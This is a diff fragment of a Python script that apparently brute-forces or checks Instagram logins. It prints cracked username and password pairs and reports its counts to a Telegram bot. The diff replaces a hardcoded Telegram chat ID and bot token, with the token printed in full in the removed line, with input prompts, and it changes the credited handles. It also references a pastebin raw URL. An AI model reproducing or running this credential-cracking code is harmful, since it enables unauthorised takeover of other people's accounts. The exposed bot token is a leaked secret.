@@ -71,10 +71,10 @@ else:
         webbrowser.open('')
         print(E + '[' + S + '!' + E + ']' + G + ' ID𐇭 ')
         print('\n')
-        ID = (S + '979712002')
+        ID = input(S + 'id>>>>')
         print('\n')
         sleep(2)
-        token = ('2014491240:AAEorbwtcIxYxa7r47smGOSi4Ve2ofod7wE')
+        token = input('token>>>>>>')
         w = 'https://pastebin.com/raw/xPfV5eKD'
         start_msg = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=@vooo_o @vooo_o").json()
         id_msg = start_msg['result']['message_id']
@@ -116,7 +116,7 @@ else:
             elif '"message":"challenge_required","challenge"' in req_login.text:
                 print(S + 'username S ==> : ' + username + ': password ==> : ' + password)
             else:
-                requests.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= - -@BBIBIEB \n KaLos ✅ [{zz}] \n------------------------------------------\n روح دخن ❌[{aa}]  ( {username} ) \n Dev →  KaLos | @BBIBIEB 🔥")
+                requests.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= - -@vooo_o \n 8kiuu ✅ [{zz}] \n------------------------------------------\n روح دخن ❌[{aa}]  ( {username} ) \n Dev →  KaLos | @vooo_o 🔥")
                 print(E + 'username ==> : ' + username + ': password ==> : ' + password)
                 aa += 1
 
